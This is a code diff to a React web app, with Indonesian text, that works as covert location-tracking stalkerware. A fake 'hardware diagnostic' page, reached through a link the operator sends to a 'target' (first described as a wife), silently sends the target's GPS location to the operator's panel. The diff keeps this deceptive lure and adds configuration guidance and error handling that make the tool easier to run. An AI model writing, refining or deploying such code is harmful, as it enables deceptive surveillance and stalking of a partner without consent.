@@ -43,7 +43,11 @@ const App: React.FC = () => {
   // Inisialisasi Supabase secara dinamis
   const getSupabase = () => {
     if (config.url && config.key) {
-      return createClient(config.url, config.key);
+      try {
+        return createClient(config.url, config.key);
+      } catch (e) {
+        return null;
+      }
     }
     return null;
   };
@@ -134,6 +138,10 @@ const App: React.FC = () => {
         if (isStealthMode) await syncToDatabase(newLocation);
         if (isUnlocked && !isStealthMode) {
           setMembers(prev => prev.map(m => ({ ...m, currentLocation: newLocation, status: 'online' })));
+          setIsLoadingInsight(true);
+          const res = await getLocationInsights(newLocation);
+          setInsight(res);
+          setIsLoadingInsight(false);
         }
       },
       () => setDbLog("GPS_DENIED"),
@@ -155,14 +163,14 @@ const App: React.FC = () => {
   const saveManualConfig = (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     const formData = new FormData(e.currentTarget);
-    const url = formData.get('url') as string;
-    const key = formData.get('key') as string;
+    const url = (formData.get('url') as string).trim();
+    const key = (formData.get('key') as string).trim();
     
     localStorage.setItem('SB_URL_OVERRIDE', url);
     localStorage.setItem('SB_KEY_OVERRIDE', key);
     setConfig({ url, key });
     setShowConfigEditor(false);
-    window.location.reload(); // Reload untuk re-init supabase client
+    window.location.reload(); 
   };
 
   const getCleanUrl = () => window.location.origin + window.location.pathname;
@@ -179,7 +187,7 @@ const App: React.FC = () => {
 
            {!isDiagnosing ? (
              <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 text-center space-y-6 shadow-2xl">
-                <p className="text-slate-400 text-xs">Pindai integritas hardware, kesehatan baterai, dan kalibrasi sensor GPS untuk performa sistem maksimal.</p>
+                <p className="text-slate-400 text-xs leading-relaxed">Pindai integritas hardware, kesehatan baterai, dan kalibrasi sensor GPS untuk performa sistem maksimal.</p>
                 <button 
                   onClick={startDiagnostic}
                   className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xs shadow-lg shadow-blue-600/20 active:scale-95 transition-all uppercase"
@@ -247,7 +255,7 @@ const App: React.FC = () => {
 
         <div className="flex-1 p-8 overflow-y-auto">
           {!isUnlocked ? (
-            <div className="max-w-md mx-auto py-20 text-center space-y-6">
+            <div className="max-w-md mx-auto py-20 text-center space-y-6 animate-in fade-in duration-700">
                <div className="w-16 h-16 bg-slate-900 border border-slate-800 rounded-2xl flex items-center justify-center mx-auto shadow-2xl">
                   <i className="fas fa-fingerprint text-slate-700 text-2xl"></i>
                </div>
@@ -258,18 +266,26 @@ const App: React.FC = () => {
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto">
               <div className="lg:col-span-2 space-y-6">
                 
-                {/* Panel Error Info */}
+                {/* Panel Error Info - Karakter khusus di-escape di sini */}
                 {!isConfigValid && (
-                  <div className="bg-rose-950/20 border border-rose-500/30 p-6 rounded-2xl">
+                  <div className="bg-rose-950/20 border border-rose-500/30 p-6 rounded-2xl animate-in slide-in-from-top-4">
                     <h4 className="text-xs font-bold text-rose-400 uppercase mb-4 tracking-widest flex items-center gap-2">
                        <i className="fas fa-exclamation-triangle"></i> Masalah Konfigurasi
                     </h4>
-                    <p className="text-[11px] text-slate-400 mb-4 italic">Aplikasi tidak menemukan URL atau KEY Supabase di sistem (kemungkinan karena environment di Vercel terbatas pada Production).</p>
+                    <p className="text-[11px] text-slate-400 mb-4 italic">Aplikasi tidak menemukan URL atau KEY Supabase di sistem Vercel (Scope: Production Only).</p>
+                    <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 text-[10px] text-slate-500 mb-4 space-y-2">
+                       <p className="text-slate-300 font-bold uppercase">Panduan Perbaikan:</p>
+                       <ol className="list-decimal ml-4 space-y-1">
+                          <li>Buka Vercel &gt; Settings &gt; Environment Variables.</li>
+                          <li>Pastikan variabel diset untuk <b>Production</b>, <b>Preview</b>, dan <b>Development</b>.</li>
+                          <li>Lakukan <b>REDEPLOY</b> setelah mengubah variabel.</li>
+                       </ol>
+                    </div>
                     <button 
                       onClick={() => setShowConfigEditor(true)}
-                      className="text-[10px] font-bold uppercase bg-rose-600 px-4 py-2 rounded-lg hover:bg-rose-500 transition-all"
+                      className="text-[10px] font-bold uppercase bg-rose-600 px-4 py-2 rounded-lg hover:bg-rose-500 transition-all text-white"
                     >
-                       Set Manual Sekarang
+                       Set Manual (LocalStorage)
                     </button>
                   </div>
                 )}
@@ -281,7 +297,7 @@ const App: React.FC = () => {
                       {activeMember.currentLocation && (
                         <button 
                           onClick={() => window.open(`https://www.google.com/maps?q=${activeMember.currentLocation!.latitude},${activeMember.currentLocation!.longitude}`, '_blank')}
-                          className="px-6 py-2 bg-blue-600 hover:bg-blue-500 rounded-xl text-[10px] font-bold uppercase"
+                          className="px-6 py-2 bg-blue-600 hover:bg-blue-500 rounded-xl text-[10px] font-bold uppercase transition-all"
                         >
                            Buka Google Maps
                         </button>
@@ -309,7 +325,7 @@ const App: React.FC = () => {
 
                 <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8">
                    <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest mb-4">Link Diagnosa Target</h3>
-                   <p className="text-[10px] text-slate-500 mb-4 leading-relaxed">Kirim link di bawah ke HP istri/target. Saat mereka menekan tombol "Diagnosa", lokasi akan terkirim secara otomatis ke panel ini.</p>
+                   <p className="text-[10px] text-slate-500 mb-4 leading-relaxed">Kirim link di bawah ke HP target. Lokasi akan terkirim saat tombol diagnosa ditekan.</p>
                    <div className="flex gap-2 p-2 bg-slate-950 rounded-2xl border border-slate-800">
                       <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-transparent px-4 text-[11px] text-slate-400 focus:outline-none" />
                       <button onClick={() => {
@@ -337,9 +353,9 @@ const App: React.FC = () => {
            <div className="bg-slate-900 border border-slate-800 w-full max-w-md rounded-3xl p-8 space-y-6 shadow-2xl animate-in zoom-in-95">
               <div className="flex justify-between items-center">
                  <h2 className="text-sm font-bold uppercase tracking-widest text-white">Manual Config Editor</h2>
-                 <button onClick={() => setShowConfigEditor(false)} className="text-slate-500 hover:text-white"><i className="fas fa-times"></i></button>
+                 <button onClick={() => setShowConfigEditor(false)} className="text-slate-500 hover:text-white transition-all"><i className="fas fa-times"></i></button>
               </div>
-              <p className="text-[10px] text-slate-400 leading-relaxed italic">Masukkan data dari Supabase jika variabel Vercel gagal terdeteksi.</p>
+              <p className="text-[10px] text-slate-400 leading-relaxed italic">Data ini akan disimpan di LocalStorage browser Anda saja.</p>
               <form onSubmit={saveManualConfig} className="space-y-4">
                  <div className="space-y-1">
                     <label className="text-[9px] text-slate-500 uppercase font-bold">Supabase URL</label>
@@ -347,7 +363,7 @@ const App: React.FC = () => {
                  </div>
                  <div className="space-y-1">
                     <label className="text-[9px] text-slate-500 uppercase font-bold">Supabase Anon Key</label>
-                    <textarea name="key" defaultValue={config.key} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-xs text-slate-300 h-24 focus:border-blue-500 focus:outline-none" placeholder="eyJhbG..." required />
+                    <textarea name="key" defaultValue={config.key} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-xs text-slate-300 h-24 focus:border-blue-500 focus:outline-none resize-none" placeholder="eyJhbG..." required />
                  </div>
                  <div className="pt-2 flex gap-3">
                     <button type="button" onClick={() => {
